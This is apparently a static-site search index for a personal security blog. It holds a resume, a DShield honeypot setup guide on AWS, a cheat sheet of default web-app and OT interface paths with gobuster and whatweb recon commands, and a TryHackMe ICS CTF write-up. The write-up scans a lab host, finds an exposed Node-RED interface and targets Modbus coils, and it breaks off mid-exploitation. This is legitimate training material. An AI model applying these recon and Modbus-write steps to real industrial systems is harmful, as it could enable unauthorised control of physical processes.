{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"Welcome to My Documentation Site Hey, I\u2019m Robbie \ud83d\udc4b This site is where I document tech experiments, cybersecurity walkthroughs, and general nerdy deep dives. Whether it\u2019s building, reverse engineering, or trying something weird in a home lab \u2014 I break it down step-by-step so it's fun and easy to follow. You\u2019re welcome to borrow, learn from, or remix anything you see here. I use this space for: - \ud83d\udee0 Guides for personal projects I\u2019ve tackled - \ud83d\udd0d Notes from CTFs and security exercises (mostly TryHackMe) - \ud83e\udde0 Stuff I wanted to remember and thought you might too Enjoy the docs. Stay curious.","title":"Home"},{"location":"#welcome-to-my-documentation-site","text":"Hey, I\u2019m Robbie \ud83d\udc4b This site is where I document tech experiments, cybersecurity walkthroughs, and general nerdy deep dives. Whether it\u2019s building, reverse engineering, or trying something weird in a home lab \u2014 I break it down step-by-step so it's fun and easy to follow. You\u2019re welcome to borrow, learn from, or remix anything you see here. I use this space for: - \ud83d\udee0 Guides for personal projects I\u2019ve tackled - \ud83d\udd0d Notes from CTFs and security exercises (mostly TryHackMe) - \ud83e\udde0 Stuff I wanted to remember and thought you might too Enjoy the docs. Stay curious.","title":"Welcome to My Documentation Site"},{"location":"resume/","text":"My Professional Experience Welcome! This page outlines my professional experience in IT infrastructure, cybersecurity, and industrial systems. I've spent the last decade designing resilient systems, mentoring teams, and helping secure critical environments. I\u2019m passionate about sharing what I\u2019ve learned and supporting others on their tech journey. \ud83e\udde0 Experience Lead Security Analyst \u2013 GRC 2024 \u2013 Present - Designed and deployed network segmentation to isolate operational environments. - Implemented an asset and vulnerability management process to support continuous risk mitigation. - Developed secure remote access for sensitive systems. - Mentored junior team members and provided technical leadership. Lead Systems Analyst \u2013 Infrastructure & Automation 2022 \u2013 2024 - Led enterprise patch management and vulnerability research programs. - Re-architected backup and disaster recovery for petabyte-scale data. - Improved recovery times and introduced immutable backups. - Managed infrastructure architecture and coordinated global teams. - Oversaw vendor operations for infrastructure and data platforms. Senior Systems Analyst \u2013 Platform Engineering 2018 \u2013 2022 - Rolled out remote desktop solutions across industrial environments. - Led a large-scale control system upgrade with zero downtime. - Provided tier-3 support and developed internal documentation. - Mentored interns and subject matter experts. Systems Analyst \u2013 Server Engineering 2015 \u2013 2017 - Upgraded legacy platforms and migrated systems to modern environments. - Reduced support requests and licensing costs through consolidation. - Built service dashboards and introduced support performance metrics. \ud83c\udf93 Education Bachelor of Arts \u2013 Communications 2012 \u2013 2016 \ud83d\udcdc Certifications SANS GICSP (Active since 2024) \ud83d\udee0\ufe0f Skills & Tools Infrastructure Design \u00b7 Server Administration \u00b7 Backup & Recovery \u00b7 Directory Services \u00b7 PowerShell & Python \u00b7 Linux & Windows \u00b7 Remote Access \u00b7 ICS/OT Security \u00b7 Project Management \u00b7 Vendor Oversight \u00b7 Mentorship \u00b7 Vulnerability Management Thanks for checking out my experience! If you\u2019re working on something cool in tech or security, I\u2019d love to hear about it.","title":"Resume"},{"location":"resume/#my-professional-experience","text":"Welcome! This page outlines my professional experience in IT infrastructure, cybersecurity, and industrial systems. I've spent the last decade designing resilient systems, mentoring teams, and helping secure critical environments. I\u2019m passionate about sharing what I\u2019ve learned and supporting others on their tech journey.","title":"My Professional Experience"},{"location":"resume/#experience","text":"","title":"\ud83e\udde0 Experience"},{"location":"resume/#lead-security-analyst-grc","text":"2024 \u2013 Present - Designed and deployed network segmentation to isolate operational environments. - Implemented an asset and vulnerability management process to support continuous risk mitigation. - Developed secure remote access for sensitive systems. - Mentored junior team members and provided technical leadership.","title":"Lead Security Analyst \u2013 GRC"},{"location":"resume/#lead-systems-analyst-infrastructure-automation","text":"2022 \u2013 2024 - Led enterprise patch management and vulnerability research programs. - Re-architected backup and disaster recovery for petabyte-scale data. - Improved recovery times and introduced immutable backups. - Managed infrastructure architecture and coordinated global teams. - Oversaw vendor operations for infrastructure and data platforms.","title":"Lead Systems Analyst \u2013 Infrastructure &amp; Automation"},{"location":"resume/#senior-systems-analyst-platform-engineering","text":"2018 \u2013 2022 - Rolled out remote desktop solutions across industrial environments. - Led a large-scale control system upgrade with zero downtime. - Provided tier-3 support and developed internal documentation. - Mentored interns and subject matter experts.","title":"Senior Systems Analyst \u2013 Platform Engineering"},{"location":"resume/#systems-analyst-server-engineering","text":"2015 \u2013 2017 - Upgraded legacy platforms and migrated systems to modern environments. - Reduced support requests and licensing costs through consolidation. - Built service dashboards and introduced support performance metrics.","title":"Systems Analyst \u2013 Server Engineering"},{"location":"resume/#education","text":"Bachelor of Arts \u2013 Communications 2012 \u2013 2016","title":"\ud83c\udf93 Education"},{"location":"resume/#certifications","text":"SANS GICSP (Active since 2024)","title":"\ud83d\udcdc Certifications"},{"location":"resume/#skills-tools","text":"Infrastructure Design \u00b7 Server Administration \u00b7 Backup & Recovery \u00b7 Directory Services \u00b7 PowerShell & Python \u00b7 Linux & Windows \u00b7 Remote Access \u00b7 ICS/OT Security \u00b7 Project Management \u00b7 Vendor Oversight \u00b7 Mentorship \u00b7 Vulnerability Management Thanks for checking out my experience! If you\u2019re working on something cool in tech or security, I\u2019d love to hear about it.","title":"\ud83d\udee0\ufe0f Skills &amp; Tools"},{"location":"blog/honeypots/","text":"Why I Like Internet Storm Center & DShield (and How You Can Help Too) I'm a big fan of the SANS Internet Storm Center (ISC) and its community-driven mission to track global internet threats. They publish daily handler diaries, offer practical incident response tools, and provide a platform where people like you and me can contribute valuable data. One of the most impactful ways to do that is by running a DShield Honeypot . DShield is a low-interaction honeypot that collects SSH, Telnet, and HTTP scan data. It\u2019s lightweight, informative, and most importantly, it shares that telemetry with ISC to help map emerging threats. Setting one up on AWS is a great weekend project, especially if you're into networking, cloud, or cybersecurity. Below is a step-by-step guide I followed and adapted from Matthew OB's post . Comprehensive Guide: Setting Up a DShield Honeypot on AWS (Ubuntu 22.04 LTS) 1. Introduction This guide walks through setting up a DShield low-interaction honeypot using Ubuntu Server 22.04 LTS on an AWS EC2 instance. It includes practical steps and insights from: https://matthewob5.medium.com/setting-up-a-dshield-honeypot-in-aws-2ca5f8a29d9 2. What is DShield? DShield is a low-interaction honeypot created by the SANS Internet Storm Center (ISC). It: - Collects SSH and Telnet login attempts (via Cowrie) - Captures HTTP requests - Logs firewall activity - Sends logs to ISC for global correlation 3. Requirements AWS Free Tier account DShield account: https://secure.dshield.org/myaccount.html SSH key pair Familiarity with Linux terminal Tips: - Enable MFA on AWS accounts - Use IAM users, not root - Set Free Tier alerts 4. Launch EC2 Instance Use Ubuntu Server 22.04 LTS . Do not use 24.04, there are differences in 24.04 that break DShield. Go to EC2 > Launch Instance Name: DShieldHoneypot AMI: Ubuntu Server 22.04 LTS Instance type: t2.micro Key pair: Use or create .pem file Storage: 25 GB Security Group: Inbound: Allow SSH (port 22) from Your_Public_IP/32 5. SSH into EC2 & Update Default SSH Credentials: * Username: ubuntu * Password: None (login is done via SSH key only - password authentication is disabled by default) Use the command below to connect: chmod 400 your-key.pem ssh -i your-key.pem ubuntu@<EC2_PUBLIC_IP> Use the command below to connect: sudo apt update && sudo apt upgrade -y sudo reboot Reconnect after reboot. 6. Create Honeypot User Before tightening sudo permissions, **set a password for the ``user to avoid locking yourself out: sudo passwd ubuntu You'll be prompted to enter and confrm a new password. Save it in a secure location. Then, create a dedicated, non-login user: sudo adduser --disabled-password --gecos \"DShield Honeypot\" dshield Lock down sudo access by editing sudoers: sudo visudo /etc/sudoers.d/90-cloud-init-users Change: ubuntu ALL=(ALL) NOPASSWD:ALL To: ubuntu ALL=(ALL) ALL 7. Install Dependencies Run each command separately to spot issues: sudo apt install python3-pip python2.7 git -y curl https://bootstrap.pypa.io/pip/2.7/get-pip.py --output get-pip.py sudo python2.7 get-pip.py Note: python-pip is no longer available - use the pip bootstrap script for Python 2. Reboot the server again: sudo reboot 8. Install DShield Setup the installation environment and run the install script mkdir ~/install && cd ~/install git clone https://github.com/DShield-ISC/dshield.git cd dshield/bin sudo ./install.sh The installer will walk you through configuration: Accept risk and privacy notices Choose Automatic Updates Enter your DShield email and API key > Click Verify Select network interface (usually eth0 ) Configure: Admin Port: Keep default 12222 or choose another Local Network: Use 172.16.0.0/12 if this is your only instance or the full VPC CIDR Additional IPs: Add your public IP Add the same IPs under Ignore FW Log (they won't be logged or redirected) SSL Certificate: Accept default fields: US / Florida / Jacksonville / DShield / Decoy Let it generate a new CA Configure Honeypot Exceptions: Add same IPs to disable honeypot for (internal testing IPs) Add ports 2222 , 2223 , and 8000 to exclude from redirection and logging Watch Out: If you enter incorrect IPs or CIDRs during this step (e.g., mistyping your home IP or setting a wrong subnet), you may block yourself from SSH access on the admin port. If this happens, update the AWS Security Group to temporarily allow access again. Watch Out: The DShield installer modifies /etc/ssh/sshd_config to change the SSH port to 12222. However, this change does not always take effect immediately. Before rebooting: Run sudo ss -tuln | grep 12222 \u2014 confirm the port is open. If it\u2019s not open, run: sudo systemctl restart ssh sudo ss -tuln | grep 12222 Confirm success before continuing. Update the security group attached to the EC2 instance, not just the subnet-level ACLs. The SG must allow TCP 12222 inbound from your IP. Then, test SSH access from your local machine in a separate terminal: ssh -p 12222 -i /path/to/your-key.pem ubuntu@<EC2_PUBLIC_IP> Only proceed with the reboot after confirming that SSH on port 12222 is working. Then reboot: sudo reboot -- 9. Update Security Group Update your Security Group to expose the honeypot to the internet while restricting management access. Recommended Inbound Rules: Type Protocol Port Range Source Description Custom TCP TCP 12222 /32 Allow SSH from home Custom TCP TCP 0-12221 0.0.0.0/0 Expose honeypot ports Custom TCP TCP 12223-65535 0.0.0.0/0 Expose honeypot ports Custom UDP UDP 0-12221 0.0.0.0/0 Expose honeypot ports Custom UDP UDP 12223-65535 0.0.0.0/0 Expose honeypot ports All ICMP - IPv4 ICMP All 0.0.0.0/0 Allow ping/traceroute All ICMP - IPv6 ICMPv6 All ::/0 Allow IPv6 ping (Same TCP/UDP) TCP/UDP All ranges ::/0 Matching IPv6 exposure Outbound Rules: | Type | Port | Destination | Description | |--------------|------|-------------|--------------------| | All traffic | All | 0.0.0.0/0 | Allow outbound | Update Inbound ACLs | Rule # | Type | Protocol | Port Range | Source | Action | |--------|-------------|----------|------------|---------------------|--------| | 100 | All traffic | All | All | 0.0.0.0/0 | Allow | | 110 | Custom TCP | TCP (6) | 12222 | /32 | Allow | | * | All traffic | All | All | 0.0.0.0/0 | Deny | Update Outbound ACLs | Rule # | Type | Protocol | Port Range | Destination | Action | |--------|-------------|----------|--------------|----------------------|--------| | 100 | All traffic | All | All | 0.0.0.0/0 | Allow | | 110 | Custom TCP | TCP (6) | 1024-65535 | /32 | Allow | | * | All traffic | All | All | 0.0.0.0/0 | Deny | Watch Out: Creating the correct security group is not enough - you must associate it with the instance: 1. Go to EC2 -> Instances 2. Select your honeypot instance 3. Scroll to the Security tab 4. Click Manage Security Groups 5. Ensure your SG is added Note: AWS allows traffic if any associated SG allows it. Watch Out: Creating the ACL is not enough \u2014 you must associate it with the subnet: 1. Go to VPC \u2192 Network ACLs 2. Select your honeypot ACL 3. Click the \u201cSubnet associations\u201d tab 4. Click Edit subnet associations 5. Check the box for the subnet your honeypot EC2 instance is using 6. Save your changes Note: NACLs apply at the subnet level and evaluate both inbound and outbound rules. The most specific (lowest rule number) is evaluated first. Be sure your allow rules come before the default deny. What if your IP changes? If your public IP changes and you've restricted port 12222 to your old IP, you'll lose SSH access. To fix this: 1. Log into the AWS Console. 2. Go to EC2 > Security Groups. 3. Find your honeypot's SG and edit the inbound rules. 4. Update the Custom TCP rule for port 12222 to reflect <your new public IP> (use whatismyip.com to find it). 10. Verify Status Run the status script: cd ~/install/dshield/bin ./status.sh Look for messages like: Submitted to DShield: N log(s) sent. All services running. Reboot the server if there are any errors. Otherwise refer to https://github.com/DShield-ISC/dshield/blob/main/STATUSERRORS.md 11. Maintenance It\u2019s a good idea to log in once a month to run sudo apt update && sudo apt upgrade -y , followed by a system reboot . Running the update.sh script monthly is also recommended to ensure your honeypot stays current. sudo apt update && sudo apt upgrade -y sudo reboot cd ~/install/dshield/bin ./update.sh 12. View Logs After some time, log into your DShield account ahd check: - SSH Logs - Web Logs - Firewall Events URL: https://secure.dshield.org/myaccount.html Done Your AWS-hosted DShield honeypot is now online and feeding threat data to the Internet Storm Center. You've also locked it down properly and added safety measures to avoid accidental lockouts. For screenshots and visuals, refer to Matthew\u2019s blog post.","title":"Why I Use Honeypots"},{"location":"blog/honeypots/#why-i-like-internet-storm-center-dshield-and-how-you-can-help-too","text":"I'm a big fan of the SANS Internet Storm Center (ISC) and its community-driven mission to track global internet threats. They publish daily handler diaries, offer practical incident response tools, and provide a platform where people like you and me can contribute valuable data. One of the most impactful ways to do that is by running a DShield Honeypot . DShield is a low-interaction honeypot that collects SSH, Telnet, and HTTP scan data. It\u2019s lightweight, informative, and most importantly, it shares that telemetry with ISC to help map emerging threats. Setting one up on AWS is a great weekend project, especially if you're into networking, cloud, or cybersecurity. Below is a step-by-step guide I followed and adapted from Matthew OB's post .","title":"Why I Like Internet Storm Center &amp; DShield (and How You Can Help Too)"},{"location":"blog/honeypots/#comprehensive-guide-setting-up-a-dshield-honeypot-on-aws-ubuntu-2204-lts","text":"","title":"Comprehensive Guide: Setting Up a DShield Honeypot on AWS (Ubuntu 22.04 LTS)"},{"location":"blog/honeypots/#1-introduction","text":"This guide walks through setting up a DShield low-interaction honeypot using Ubuntu Server 22.04 LTS on an AWS EC2 instance. It includes practical steps and insights from: https://matthewob5.medium.com/setting-up-a-dshield-honeypot-in-aws-2ca5f8a29d9","title":"1. Introduction"},{"location":"blog/honeypots/#2-what-is-dshield","text":"DShield is a low-interaction honeypot created by the SANS Internet Storm Center (ISC). It: - Collects SSH and Telnet login attempts (via Cowrie) - Captures HTTP requests - Logs firewall activity - Sends logs to ISC for global correlation","title":"2. What is DShield?"},{"location":"blog/honeypots/#3-requirements","text":"AWS Free Tier account DShield account: https://secure.dshield.org/myaccount.html SSH key pair Familiarity with Linux terminal Tips: - Enable MFA on AWS accounts - Use IAM users, not root - Set Free Tier alerts","title":"3. Requirements"},{"location":"blog/honeypots/#4-launch-ec2-instance","text":"Use Ubuntu Server 22.04 LTS . Do not use 24.04, there are differences in 24.04 that break DShield. Go to EC2 > Launch Instance Name: DShieldHoneypot AMI: Ubuntu Server 22.04 LTS Instance type: t2.micro Key pair: Use or create .pem file Storage: 25 GB Security Group: Inbound: Allow SSH (port 22) from Your_Public_IP/32","title":"4. Launch EC2 Instance"},{"location":"blog/honeypots/#5-ssh-into-ec2-update","text":"Default SSH Credentials: * Username: ubuntu * Password: None (login is done via SSH key only - password authentication is disabled by default) Use the command below to connect: chmod 400 your-key.pem ssh -i your-key.pem ubuntu@<EC2_PUBLIC_IP> Use the command below to connect: sudo apt update && sudo apt upgrade -y sudo reboot Reconnect after reboot.","title":"5. SSH into EC2 &amp; Update"},{"location":"blog/honeypots/#6-create-honeypot-user","text":"Before tightening sudo permissions, **set a password for the ``user to avoid locking yourself out: sudo passwd ubuntu You'll be prompted to enter and confrm a new password. Save it in a secure location. Then, create a dedicated, non-login user: sudo adduser --disabled-password --gecos \"DShield Honeypot\" dshield Lock down sudo access by editing sudoers: sudo visudo /etc/sudoers.d/90-cloud-init-users Change: ubuntu ALL=(ALL) NOPASSWD:ALL To: ubuntu ALL=(ALL) ALL","title":"6. Create Honeypot User"},{"location":"blog/honeypots/#7-install-dependencies","text":"Run each command separately to spot issues: sudo apt install python3-pip python2.7 git -y curl https://bootstrap.pypa.io/pip/2.7/get-pip.py --output get-pip.py sudo python2.7 get-pip.py Note: python-pip is no longer available - use the pip bootstrap script for Python 2. Reboot the server again: sudo reboot","title":"7. Install Dependencies"},{"location":"blog/honeypots/#8-install-dshield","text":"Setup the installation environment and run the install script mkdir ~/install && cd ~/install git clone https://github.com/DShield-ISC/dshield.git cd dshield/bin sudo ./install.sh The installer will walk you through configuration: Accept risk and privacy notices Choose Automatic Updates Enter your DShield email and API key > Click Verify Select network interface (usually eth0 ) Configure: Admin Port: Keep default 12222 or choose another Local Network: Use 172.16.0.0/12 if this is your only instance or the full VPC CIDR Additional IPs: Add your public IP Add the same IPs under Ignore FW Log (they won't be logged or redirected) SSL Certificate: Accept default fields: US / Florida / Jacksonville / DShield / Decoy Let it generate a new CA Configure Honeypot Exceptions: Add same IPs to disable honeypot for (internal testing IPs) Add ports 2222 , 2223 , and 8000 to exclude from redirection and logging Watch Out: If you enter incorrect IPs or CIDRs during this step (e.g., mistyping your home IP or setting a wrong subnet), you may block yourself from SSH access on the admin port. If this happens, update the AWS Security Group to temporarily allow access again. Watch Out: The DShield installer modifies /etc/ssh/sshd_config to change the SSH port to 12222. However, this change does not always take effect immediately. Before rebooting: Run sudo ss -tuln | grep 12222 \u2014 confirm the port is open. If it\u2019s not open, run: sudo systemctl restart ssh sudo ss -tuln | grep 12222 Confirm success before continuing. Update the security group attached to the EC2 instance, not just the subnet-level ACLs. The SG must allow TCP 12222 inbound from your IP. Then, test SSH access from your local machine in a separate terminal: ssh -p 12222 -i /path/to/your-key.pem ubuntu@<EC2_PUBLIC_IP> Only proceed with the reboot after confirming that SSH on port 12222 is working. Then reboot: sudo reboot --","title":"8. Install DShield"},{"location":"blog/honeypots/#9-update-security-group","text":"Update your Security Group to expose the honeypot to the internet while restricting management access. Recommended Inbound Rules: Type Protocol Port Range Source Description Custom TCP TCP 12222 /32 Allow SSH from home Custom TCP TCP 0-12221 0.0.0.0/0 Expose honeypot ports Custom TCP TCP 12223-65535 0.0.0.0/0 Expose honeypot ports Custom UDP UDP 0-12221 0.0.0.0/0 Expose honeypot ports Custom UDP UDP 12223-65535 0.0.0.0/0 Expose honeypot ports All ICMP - IPv4 ICMP All 0.0.0.0/0 Allow ping/traceroute All ICMP - IPv6 ICMPv6 All ::/0 Allow IPv6 ping (Same TCP/UDP) TCP/UDP All ranges ::/0 Matching IPv6 exposure Outbound Rules: | Type | Port | Destination | Description | |--------------|------|-------------|--------------------| | All traffic | All | 0.0.0.0/0 | Allow outbound | Update Inbound ACLs | Rule # | Type | Protocol | Port Range | Source | Action | |--------|-------------|----------|------------|---------------------|--------| | 100 | All traffic | All | All | 0.0.0.0/0 | Allow | | 110 | Custom TCP | TCP (6) | 12222 | /32 | Allow | | * | All traffic | All | All | 0.0.0.0/0 | Deny | Update Outbound ACLs | Rule # | Type | Protocol | Port Range | Destination | Action | |--------|-------------|----------|--------------|----------------------|--------| | 100 | All traffic | All | All | 0.0.0.0/0 | Allow | | 110 | Custom TCP | TCP (6) | 1024-65535 | /32 | Allow | | * | All traffic | All | All | 0.0.0.0/0 | Deny | Watch Out: Creating the correct security group is not enough - you must associate it with the instance: 1. Go to EC2 -> Instances 2. Select your honeypot instance 3. Scroll to the Security tab 4. Click Manage Security Groups 5. Ensure your SG is added Note: AWS allows traffic if any associated SG allows it. Watch Out: Creating the ACL is not enough \u2014 you must associate it with the subnet: 1. Go to VPC \u2192 Network ACLs 2. Select your honeypot ACL 3. Click the \u201cSubnet associations\u201d tab 4. Click Edit subnet associations 5. Check the box for the subnet your honeypot EC2 instance is using 6. Save your changes Note: NACLs apply at the subnet level and evaluate both inbound and outbound rules. The most specific (lowest rule number) is evaluated first. Be sure your allow rules come before the default deny. What if your IP changes? If your public IP changes and you've restricted port 12222 to your old IP, you'll lose SSH access. To fix this: 1. Log into the AWS Console. 2. Go to EC2 > Security Groups. 3. Find your honeypot's SG and edit the inbound rules. 4. Update the Custom TCP rule for port 12222 to reflect <your new public IP> (use whatismyip.com to find it).","title":"9. Update Security Group"},{"location":"blog/honeypots/#10-verify-status","text":"Run the status script: cd ~/install/dshield/bin ./status.sh Look for messages like: Submitted to DShield: N log(s) sent. All services running. Reboot the server if there are any errors. Otherwise refer to https://github.com/DShield-ISC/dshield/blob/main/STATUSERRORS.md","title":"10. Verify Status"},{"location":"blog/honeypots/#11-maintenance","text":"It\u2019s a good idea to log in once a month to run sudo apt update && sudo apt upgrade -y , followed by a system reboot . Running the update.sh script monthly is also recommended to ensure your honeypot stays current. sudo apt update && sudo apt upgrade -y sudo reboot cd ~/install/dshield/bin ./update.sh","title":"11. Maintenance"},{"location":"blog/honeypots/#12-view-logs","text":"After some time, log into your DShield account ahd check: - SSH Logs - Web Logs - Firewall Events URL: https://secure.dshield.org/myaccount.html","title":"12. View Logs"},{"location":"blog/honeypots/#done","text":"Your AWS-hosted DShield honeypot is now online and feeding threat data to the Internet Storm Center. You've also locked it down properly and added safety measures to avoid accidental lockouts. For screenshots and visuals, refer to Matthew\u2019s blog post.","title":"Done"},{"location":"blog/webpaths/","text":"\ud83e\udded Web App Default Paths Cheat Sheet When scanning a network or analyzing a web server, knowing the default paths of popular tools can save you a ton of time. Here\u2019s a field-ready cheat sheet for quickly identifying web apps based on their common routes. \ud83e\uddf1 Node-RED Purpose Path Editor UI / or /red Dashboard UI /ui Flow JSON API /flows \ud83d\udd25 Flask / Werkzeug Apps Purpose Path Examples Admin/Login /login , /admin API Entry /api/ , /api/status , /api/gate Flask Debug Panel Only if misconfigured \u2014 look for /console in stack traces \ud83d\udc18 phpMyAdmin / MySQL Admin Tool Common Paths phpMyAdmin /phpmyadmin , /pma , /mysqladmin , /dbadmin \ud83e\uddea Jenkins Purpose Path Dashboard / , /jenkins , /dashboard Script Console /script \ud83d\udcca Grafana Purpose Path Login/Dashboard /login , /d/ , /dashboard/ \ud83d\udcc8 Kibana Purpose Path Dashboard /app/kibana \ud83d\udcc9 Prometheus Purpose Path Web UI /graph , /metrics \ud83c\udfed Industrial / OT Interfaces These should never be exposed to the public internet, but if you encounter them: Tool Default Port Path Hints Web HMI varies / , /ui , /hmi , /dashboard PLC Admin UI 80, 443 /plc , /admin , /setup \ud83c\udf81 Bonus Tip: Auto-Discovery Tools If guessing doesn't work, try some recon tools: whatweb http://<ip>:<port> ```` or gobuster dir -u http:// : -w /usr/share/wordlists/dirb/common.txt ``` These tools can brute-force or fingerprint the server to uncover hidden or non-standard paths. Stay curious, and don\u2019t forget to double-check if what you find should be exposed at all.","title":"Web App Default Paths"},{"location":"blog/webpaths/#web-app-default-paths-cheat-sheet","text":"When scanning a network or analyzing a web server, knowing the default paths of popular tools can save you a ton of time. Here\u2019s a field-ready cheat sheet for quickly identifying web apps based on their common routes.","title":"\ud83e\udded Web App Default Paths Cheat Sheet"},{"location":"blog/webpaths/#node-red","text":"Purpose Path Editor UI / or /red Dashboard UI /ui Flow JSON API /flows","title":"\ud83e\uddf1 Node-RED"},{"location":"blog/webpaths/#flask-werkzeug-apps","text":"Purpose Path Examples Admin/Login /login , /admin API Entry /api/ , /api/status , /api/gate Flask Debug Panel Only if misconfigured \u2014 look for /console in stack traces","title":"\ud83d\udd25 Flask / Werkzeug Apps"},{"location":"blog/webpaths/#phpmyadmin-mysql-admin","text":"Tool Common Paths phpMyAdmin /phpmyadmin , /pma , /mysqladmin , /dbadmin","title":"\ud83d\udc18 phpMyAdmin / MySQL Admin"},{"location":"blog/webpaths/#jenkins","text":"Purpose Path Dashboard / , /jenkins , /dashboard Script Console /script","title":"\ud83e\uddea Jenkins"},{"location":"blog/webpaths/#grafana","text":"Purpose Path Login/Dashboard /login , /d/ , /dashboard/","title":"\ud83d\udcca Grafana"},{"location":"blog/webpaths/#kibana","text":"Purpose Path Dashboard /app/kibana","title":"\ud83d\udcc8 Kibana"},{"location":"blog/webpaths/#prometheus","text":"Purpose Path Web UI /graph , /metrics","title":"\ud83d\udcc9 Prometheus"},{"location":"blog/webpaths/#industrial-ot-interfaces","text":"These should never be exposed to the public internet, but if you encounter them: Tool Default Port Path Hints Web HMI varies / , /ui , /hmi , /dashboard PLC Admin UI 80, 443 /plc , /admin , /setup","title":"\ud83c\udfed Industrial / OT Interfaces"},{"location":"blog/webpaths/#bonus-tip-auto-discovery-tools","text":"If guessing doesn't work, try some recon tools: whatweb http://<ip>:<port> ```` or gobuster dir -u http:// : -w /usr/share/wordlists/dirb/common.txt ``` These tools can brute-force or fingerprint the server to uncover hidden or non-standard paths. Stay curious, and don\u2019t forget to double-check if what you find should be exposed at all.","title":"\ud83c\udf81 Bonus Tip: Auto-Discovery Tools"},{"location":"industrial-intrusion-tryhackme/Intro/","text":"My First ICS-Themed CTF: TryHackMe\u2019s Industrial Intrusion I recently wrapped up my first Capture the Flag (CTF) event on the TryHackMe platform, and I have to say, Industrial Intrusion was one of the most rewarding challenges I\u2019ve taken on in a while. Even though I\u2019ve been working in the field of ICS (Industrial Control Systems) security for some time now, I\u2019ve only dabbled with TryHackMe here and there over the past couple of years. This event marked the first time I committed to a full CTF on the platform, and it exceeded my expectations. A Learning Experience on Multiple Fronts What stood out most to me was how much I learned, not just in terms of the content (which was solid and thoughtfully constructed), but also about the structure and pacing of CTFs themselves. The tasks forced me to think creatively, pivot when things didn\u2019t work, and dig into some areas of ICS security I hadn\u2019t explored in depth before. There were moments of frustration, sure, but also plenty of \u201ca-ha!\u201d moments that made it all worth it. During some challenges, when I would be ready to quit, suddenly, I'd find the flag and get a boost of energy to keep going. From probing Modbus services to poking around OpenPLC runtimes, this CTF did a great job blending real-world ICS scenarios with hands-on offensive techniques. It was the kind of learning experience that sticks. Shoutout to My Team One of the unexpected highlights of the event was the team I ended up with. We were just a bunch of randoms thrown together. No preexisting connections, no coordinated strategy at the start. A few folks dropped off early on, but three of us who stuck around ended up forming a solid working group. Despite the challenges and limited time, we managed to complete over half of the tasks. Not bad for a first-timer team without prior coordination! Working together under pressure, bouncing ideas off each other, and sharing the occasional frustration or breakthrough. It reminded me why I love this field. Final Thoughts I\u2019d highly recommend Industrial Intrusion to anyone with an interest in ICS or OT security, regardless of your experience level. If you\u2019ve never done a CTF, this is a great place to start. If you\u2019re like me, with some real-world experience but not much CTF background, you\u2019ll find this event to be an engaging way to push your skills further. Looking forward to the next one. Maybe next time I\u2019ll be a little faster with those Modbus registers\u2026","title":"Intro"},{"location":"industrial-intrusion-tryhackme/Intro/#my-first-ics-themed-ctf-tryhackmes-industrial-intrusion","text":"I recently wrapped up my first Capture the Flag (CTF) event on the TryHackMe platform, and I have to say, Industrial Intrusion was one of the most rewarding challenges I\u2019ve taken on in a while. Even though I\u2019ve been working in the field of ICS (Industrial Control Systems) security for some time now, I\u2019ve only dabbled with TryHackMe here and there over the past couple of years. This event marked the first time I committed to a full CTF on the platform, and it exceeded my expectations.","title":"My First ICS-Themed CTF: TryHackMe\u2019s Industrial Intrusion"},{"location":"industrial-intrusion-tryhackme/Intro/#a-learning-experience-on-multiple-fronts","text":"What stood out most to me was how much I learned, not just in terms of the content (which was solid and thoughtfully constructed), but also about the structure and pacing of CTFs themselves. The tasks forced me to think creatively, pivot when things didn\u2019t work, and dig into some areas of ICS security I hadn\u2019t explored in depth before. There were moments of frustration, sure, but also plenty of \u201ca-ha!\u201d moments that made it all worth it. During some challenges, when I would be ready to quit, suddenly, I'd find the flag and get a boost of energy to keep going. From probing Modbus services to poking around OpenPLC runtimes, this CTF did a great job blending real-world ICS scenarios with hands-on offensive techniques. It was the kind of learning experience that sticks.","title":"A Learning Experience on Multiple Fronts"},{"location":"industrial-intrusion-tryhackme/Intro/#shoutout-to-my-team","text":"One of the unexpected highlights of the event was the team I ended up with. We were just a bunch of randoms thrown together. No preexisting connections, no coordinated strategy at the start. A few folks dropped off early on, but three of us who stuck around ended up forming a solid working group. Despite the challenges and limited time, we managed to complete over half of the tasks. Not bad for a first-timer team without prior coordination! Working together under pressure, bouncing ideas off each other, and sharing the occasional frustration or breakthrough. It reminded me why I love this field.","title":"Shoutout to My Team"},{"location":"industrial-intrusion-tryhackme/Intro/#final-thoughts","text":"I\u2019d highly recommend Industrial Intrusion to anyone with an interest in ICS or OT security, regardless of your experience level. If you\u2019ve never done a CTF, this is a great place to start. If you\u2019re like me, with some real-world experience but not much CTF background, you\u2019ll find this event to be an engaging way to push your skills further. Looking forward to the next one. Maybe next time I\u2019ll be a little faster with those Modbus registers\u2026","title":"Final Thoughts"},{"location":"industrial-intrusion-tryhackme/Task%201%20-%20Gate%20Control/","text":"ICS Security Assessment - Task 1: Gate Access Control Bypass Flag Obtained: THM{s4v3_th3_d4t3_27_jun3} Executive Summary The system was compromised by identifying and exploiting an insecure Node-RED control interface exposed on port 1880. Through analysis of available dashboard components and Modbus write nodes, we discovered the control logic behind a gate access mechanism. After correcting a misconfigured Modbus Unit ID and properly triggering the required inputs through the HMI, the gate was successfully opened and the flag was retrieved. Phase 1: Comprehensive Reconnaissance A full reconnaissance scan was performed to enumerate exposed services and industrial protocols. 1.1 Port Scan Commands nmap -p- -T4 10.10.134.68 nmap -sV -p 22,80,102,502,1880,8080,44818 10.10.134.68 1.2 Discovered Services Port Service Details 22/tcp SSH OpenSSH 9.6p1 80/tcp HTTP Werkzeug Flask app serving gate status monitor 102/tcp ISO-TSAP Siemens S7 protocol 502/tcp Modbus Modbus/TCP, standard ICS protocol 1880/tcp HTTP (Node-RED) Web-based ICS control editor & dashboard 8080/tcp HTTP (Flask) OpenPLC login page 44818/tcp EtherNet/IP Rockwell PLC communication port Phase 2: Analyzing the Control Logic Node-RED was discovered running on port 1880. Direct access to both the flow editor and UI dashboard was possible, revealing how the gate was controlled. 2.1 Discovery of Node-RED Interface curl http://10.10.134.68:1880 This confirmed the editor was exposed. Knowledge of Node-RED dashboards led to manual exploration of: http://10.10.134.68:1880/ui 2.2 Control Logic Summary Badge and Motion Detector switches controlled logic via coils 15 and other . An inject node ( badge (on) ) sent a true signal to a Modbus Write node targeting coil 25 with function code 5 (Force Single Coil). The write initially failed due to Unit ID misconfiguration (1 instead of 0) . Phase 3: Exploitation via HMI and Node-RED With all logic mapped, we proceeded to exploit the system via the web dashboard and control flow editor. 3.1 Fixed Modbus Write Configuration 